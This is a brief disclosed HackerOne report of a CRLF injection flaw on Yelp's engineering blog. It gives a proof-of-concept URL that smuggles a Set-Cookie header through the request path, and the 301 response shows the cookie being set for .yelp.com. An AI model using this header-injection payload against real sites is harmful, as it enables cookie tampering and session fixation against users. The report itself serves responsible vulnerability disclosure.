# HackerOne Report: [engineeringblog.yelp.com] CRLF Injection
**Report ID:** 66391
**Vulnerability Class:** Uncategorized

## Vulnerability Information & PoC
CRLF Injection via Request-URI

PoC:

```
https://engineeringblog.yelp.com/xxcrlftest%0d%0aSet-Cookie:%20test=test;domain=.yelp.com
```
HTTP Response:
```
HTTP/1.1 301 Moved Permanently
...
Location: http://engineeringblog.yelp.com/xxcrlftest
Set-Cookie: test=test;domain=.yelp.com
```
Result:
Creating a cookie-param "test=test" on *.yelp.com

## Discussion & Remediation Timeline
